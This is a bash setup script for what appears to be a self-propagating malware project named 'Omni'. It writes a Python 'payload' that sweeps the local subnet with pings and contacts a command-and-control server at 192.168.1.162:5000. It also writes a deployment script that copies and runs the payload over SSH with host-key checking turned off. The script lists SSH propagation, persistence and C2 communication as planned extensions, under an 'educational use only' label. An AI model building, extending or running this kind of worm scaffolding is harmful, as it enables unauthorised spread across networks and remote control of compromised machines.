#!/bin/bash
echo "========================================"
echo "⚡ OMNI QUICK FIX SCRIPT"
echo "========================================"

echo "[1] Installing dependencies..."
sudo apt-get update >/dev/null 2>&1
sudo apt-get install -y sshpass python3-pip nmap >/dev/null 2>&1
pip3 install requests flask >/dev/null 2>&1

echo "[2] Fixing Python payload..."
cat > /tmp/test_payload.py << 'TESTPY'
#!/usr/bin/env python3
print("[*] Testing basic Python...")
print("[+] Import test:")
try:
    import os, sys, subprocess, threading, time, socket, json
    from pathlib import Path
    print("  ✅ Core imports OK")
    
    try:
        import requests
        print("  ✅ Requests module OK")
    except:
        print("  ❌ Requests missing, installing...")
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
    
    try:
        import netifaces
        print("  ✅ Netifaces OK")
    except:
        print("  ⚠ Netifaces not installed (optional)")
        
except Exception as e:
    print(f"  ❌ Import error: {e}")
    
print("[*] Network test:")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    print(f"  ✅ IP address: {ip}")
except:
    print("  ❌ Network error")

print("[+] Test complete")
TESTPY

python3 /tmp/test_payload.py

echo ""
echo "[3] Creating simple working payload..."
cat > payloads/v1.0/omni_simple.py << 'SIMPLECODE'
#!/usr/bin/env python3
print("[*] Omni Simple Payload v1.0")
print("[*] Testing mode")

import os
import socket
import subprocess
import time

# Basic test functions
def test_network():
    print("[*] Testing network...")
    try:
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        print(f"[+] Local IP: {ip}")
        
        # Ping gateway
        parts = ip.split('.')
        gateway = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", gateway],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print(f"[+] Gateway {gateway} is reachable")
            return True
        else:
            print(f"[-] Gateway not reachable")
            return False
            
    except Exception as e:
        print(f"[-] Network error: {e}")
        return False

def test_ssh():
    print("[*] Testing SSH capabilities...")
    
    # Check if sshpass is installed
    result = subprocess.run(
        ["which", "sshpass"],
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0:
        print("[+] sshpass is installed")
        return True
    else:
        print("[-] sshpass not installed")
        print("   Install with: sudo apt-get install sshpass")
        return False

def basic_scan():
    print("[*] Basic network scan...")
    
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        subnet = '.'.join(local_ip.split('.')[:3])
        
        print(f"[*] Scanning subnet: {subnet}.0/24")
        
        alive_hosts = []
        for i in range(1, 10):  # First 10 IPs
            target = f"{subnet}.{i}"
            if target == local_ip:
                continue
                
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "1", target],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                alive_hosts.append(target)
                print(f"  [+] {target} is alive")
        
        print(f"[*] Found {len(alive_hosts)} alive hosts")
        
    except Exception as e:
        print(f"[-] Scan error: {e}")

# Main execution
if __name__ == "__main__":
    print("========================================")
    print("🔧 OMNI SIMPLE TEST PAYLOAD")
    print("========================================")
    print("[!] Educational use only")
    print("")
    
    test_network()
    print("")
    test_ssh()
    print("")
    basic_scan()
    print("")
    
    print("[*] Test complete")
    print("[*] This payload can be extended with:")
    print("    - SSH propagation")
    print("    - USB monitoring")
    print("    - Persistence mechanisms")
    print("    - C2 communication")
    
    # Keep running for C2 test
    print("\n[*] Listening for C2 (60 seconds)...")
    print("[*] Connect to C2 server to send commands")
    
    # Simple C2 check
    try:
        import requests
        response = requests.get("http://192.168.1.162:5000", timeout=5)
        print(f"[+] C2 server reachable: {response.status_code}")
    except:
        print("[-] C2 server not reachable")
    
    time.sleep(60)
    print("[*] Shutting down")
SIMPLECODE

chmod +x payloads/v1.0/omni_simple.py

echo "[4] Testing fixed payload..."
timeout 10 python3 payloads/v1.0/omni_simple.py

echo ""
echo "[5] Creating test deployment..."
cat > test_deploy.sh << 'TESTDEPLOY'
#!/bin/bash
# Test deployment to localhost
echo "[*] Testing deployment locally..."

# Create test directory
mkdir -p /tmp/omni_test
cp payloads/v1.0/omni_simple.py /tmp/omni_test/

# Test SSH to localhost (if SSH server running)
if systemctl is-active ssh >/dev/null 2>&1; then
    echo "[+] SSH server is active"
    
    # Test passwordless SSH
    if ssh -o StrictHostKeyChecking=no localhost "echo test" >/dev/null 2>&1; then
        echo "[+] Passwordless SSH works"
        
        # Deploy to self
        scp -o StrictHostKeyChecking=no payloads/v1.0/omni_simple.py localhost:/tmp/omni_test_remote.py
        ssh -o StrictHostKeyChecking=no localhost "chmod +x /tmp/omni_test_remote.py && /tmp/omni_test_remote.py &"
        
        echo "[✅] Self-deployment successful"
    else
        echo "[-] Passwordless SSH not configured"
        echo "    Configure with: ssh-keygen and ssh-copy-id localhost"
    fi
else
    echo "[-] SSH server not running"
    echo "    Start with: sudo systemctl start ssh"
fi

echo ""
echo "[*] Manual test commands:"
echo "    python3 payloads/v1.0/omni_simple.py"
echo "    ssh localhost"
echo "    ./deploy_network_fixed.sh"
TESTDEPLOY

chmod +x test_deploy.sh

echo ""
echo "========================================"
echo "✅ QUICK FIX COMPLETE"
echo "========================================"
echo ""
echo "📋 Next Steps:"
echo "   1. Test simple payload:"
echo "      python3 payloads/v1.0/omni_simple.py"
echo ""
echo "   2. Start C2 server:"
echo "      python3 c2_server_enhanced.py"
echo ""
echo "   3. Test deployment:"
echo "      ./test_deploy.sh"
echo ""
echo "   4. Configure deployment:"
echo "      Edit deploy_network_fixed.sh with your credentials"
echo ""
echo "🔧 Troubleshooting:"
echo "   - Install missing packages: sudo apt-get install sshpass python3-pip"
echo "   - Start SSH server: sudo systemctl start ssh"
echo "   - Check firewall: sudo ufw status"
echo ""
echo "⚠️  Educational use only!"
echo "========================================"
